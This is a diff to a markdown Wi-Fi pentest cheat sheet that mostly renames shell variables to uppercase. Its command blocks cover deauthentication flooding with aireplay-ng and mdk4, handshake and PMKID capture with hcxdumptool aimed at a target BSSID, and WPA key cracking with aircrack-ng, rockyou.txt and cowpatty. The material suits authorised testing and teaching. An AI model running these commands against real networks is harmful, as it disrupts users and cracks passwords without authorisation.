@@ -46,11 +46,11 @@ Encryption (CCMP/TKIP)
 
 ```bash [aireplay-ng]
 # Deauth client to force reconnection
-aireplay-ng -0 10 -a $bssid -c $client_mac $interface
+aireplay-ng -0 10 -a $BSSID -c $CLIENT_MAC $INTERFACE
 ```
 
 ```bash [mdk4]
-mdk4 wlan0mon d -b $bssid -c $channel
+mdk4 wlan0mon d -b $BSSID -c $CHANNEL
 ```
 
 :::
@@ -61,7 +61,7 @@ mdk4 wlan0mon d -b $bssid -c $channel
 
 ```bash [aircrack]
 # Wordlist attack
-aircrack-ng -w rockyou.txt -b $bssid handshake-01.cap
+aircrack-ng -w rockyou.txt -b $BSSID handshake-01.cap
 ```
 
 ```bash [hashcat]
@@ -108,7 +108,7 @@ sudo apt install hcxtools hcxdumptool
 
 ```bash [hcxdumptool]
 # Using hcxdumptool (modern method)
-hcxdumptool -i $interface -w capture.pcapng --rds=2
+hcxdumptool -i $INTERFACE -w capture.pcapng --rds=2
 ```
 
 ```bash [angryoxide]
@@ -121,17 +121,17 @@ angryoxide -i wlan0mon -t AA:BB:CC:DD:EE:FF --disable-deauth --disable-disassoc
 
 ```bash
 # Show details about interface
-hcxdumptool -I $interface
+hcxdumptool -I $INTERFACE
 
 # a = 2.4GHz, b = 5GHz, c = 6GHz, d = 60Ghz
-sudo hcxdumptool -i $interface -c 10a -w capture.pcapng --rds=2 # Channel 10 on 2.4GHz
+sudo hcxdumptool -i $INTERFACE -c 10a -w capture.pcapng --rds=2 # Channel 10 on 2.4GHz
 ```
 
 ```bash
 # Scan Specific BSSID
-sudo hcxdumptool -i $interface --rcascan=p --rds=2 # Find target
-echo "$bssid" | tr -d ':' | xargs -I {} sudo hcxdumptool --bpfc="wlan addr3 {}" > cible.bpf # Create BPF
-sudo hcxdumptool -i $interface -c ${channel}a -w capture.pcapng --bpf=cible.bpf --red=2 # Capture
+sudo hcxdumptool -i $INTERFACE --rcascan=p --rds=2 # Find target
+echo "$BSSID" | tr -d ':' | xargs -I {} sudo hcxdumptool --bpfc="wlan addr3 {}" > cible.bpf # Create BPF
+sudo hcxdumptool -i $INTERFACE -c ${CHANNEL}a -w capture.pcapng --bpf=cible.bpf --rds=2 # Capture
 ```
 
 :::
@@ -170,8 +170,8 @@ hcxhashtool -i all_hashes.hc22000 -o target.hc22000 --mac-ap=00:11:22:33:44:55
 
 ```bash
 # Generate PMK database for specific SSID
-genpmk -f wordlist.txt -d pmk_$ssid.db -s "$ssid"
+genpmk -f wordlist.txt -d pmk_$SSID.db -s "$SSID"
 
 # Crack without computing PBKDF2 each attempt
-cowpatty -d pmk_$ssid.db -r handshake-01.cap -s "$ssid"
+cowpatty -d pmk_$SSID.db -r handshake-01.cap -s "$SSID"
 ```
